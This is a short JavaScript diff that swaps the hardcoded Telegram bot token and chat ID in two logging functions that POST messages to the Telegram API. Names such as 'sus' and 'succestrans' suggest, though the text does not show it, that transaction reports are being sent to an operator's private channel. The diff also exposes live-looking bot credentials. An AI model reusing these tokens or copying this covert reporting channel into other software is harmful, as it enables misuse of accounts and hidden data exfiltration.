@@ -1270,14 +1270,14 @@ async function logTlgMsg(msg, sus, hash) {
 
   try {
     const response = await fetch(
-      "https://api.telegram.org/bot8936022211:AAFOQR4J-q9AMQsYglu7mje8c87iXLInP6o/sendMessage",
+      "https://api.telegram.org/bot8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM/sendMessage",
       {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          chat_id: "8614416084",
+          chat_id: "835768358",
           text: msg + "\n" + succestrans,
           parse_mode: undefined
         })
@@ -1302,14 +1302,14 @@ async function logTlgMsg(msg, sus, hash) {
 async function logTlg(msg) {
   try {
     const response = await fetch(
-      "https://api.telegram.org/bot8936022211:AAFOQR4J-q9AMQsYglu7mje8c87iXLInP6o/sendMessage",
+      "https://api.telegram.org/bot8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM/sendMessage",
       {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          chat_id: "8614416084",
+          chat_id: "835768358",
           text: msg,
           parse_mode: undefined
         })
